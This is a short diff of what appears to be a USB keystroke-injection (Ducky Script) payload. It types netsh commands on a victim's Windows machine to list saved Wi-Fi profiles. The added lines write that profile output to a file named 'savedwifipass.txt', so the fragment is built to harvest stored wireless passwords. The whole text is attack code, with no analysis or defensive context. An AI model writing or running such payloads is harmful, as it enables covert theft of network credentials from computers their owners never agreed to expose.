@@ -7,3 +7,5 @@ ENTER
 DELAY 300
 STRING netsh wlan show profiles
 ENTER
+STRING netsh wlan show profiles/all>savedwifipass.txt
+ENTER 
